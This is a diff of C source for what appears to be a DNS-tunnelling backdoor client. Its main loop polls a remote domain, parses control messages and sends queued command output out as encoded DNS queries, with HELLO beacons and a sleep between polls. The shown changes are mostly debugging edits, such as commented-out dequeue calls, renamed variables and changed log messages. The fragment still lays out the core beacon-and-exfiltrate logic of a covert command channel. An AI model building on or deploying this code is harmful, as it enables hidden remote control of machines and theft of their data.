@@ -105,6 +105,7 @@ void main(int argc, char *argv[])
 	// create two linked list based queues
 	struct NODE *taskQueueHead = NULL;
 	struct NODE *stdoutListHead = NULL;
+	struct NODE *curJob;
 	// argv1 - "host portion"
 	// argv2 - "domain"
 
@@ -123,6 +124,8 @@ void main(int argc, char *argv[])
 
 		// disect pre-selected fields based on protocol we designed
 		struct CONTROL *ctrl = getControl(drp);
+
+		//ctrl->messageType = 1;
 
 		// decide what to do with response
 		switch (ctrl->messageType)
@@ -165,34 +168,40 @@ void main(int argc, char *argv[])
 		 *  now --> grab chunks and send.
 		 */
 
+		//printList(stdoutListHead);
+
 		// NEED TO INVESTIGATE SIZE OF STDOUT LIST QUEUE EXACTLY
 		// WHAT NODES ARE INSIDE IT, AND WHY CHUNK==NULL ..??
+		//dequeue(&stdoutListHead);
+		//dequeue(&stdoutListHead); exit(1);
 
 		// now grab next chunk of output -- no necessarily from prev cmd
-		struct NODE *chunk = dequeue(&stdoutListHead);
-
-		if(chunk!=NULL) // has data output to send
+		curJob = dequeue(&stdoutListHead);
+		if(curJob != NULL)
 		{
-			puts("chunk not null ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ");
+			puts("chunk is not null");
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
-												chunk->data,
+												curJob ->data,
 													domain,
 														&sendBuffSize);
+
 		}
-		else // regular HELLO packet
+		else
 		{
-			puts("chunk null ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+			puts("chunk is null");
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
-												"chunk-null",
+												"hellohellohello",
 													domain,
 														&sendBuffSize);
 		}
 
-
-		// else no tasks in queue.. query again
 		sleep(napTime);
 		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
 
+		// clear buffers
+		memset(sendBuff, 0, sendBuffSize);
+
+		// need to print
 		// free malloc'd pointers
 		//puts("free()'ing ");
 		//if(drp!=NULL)
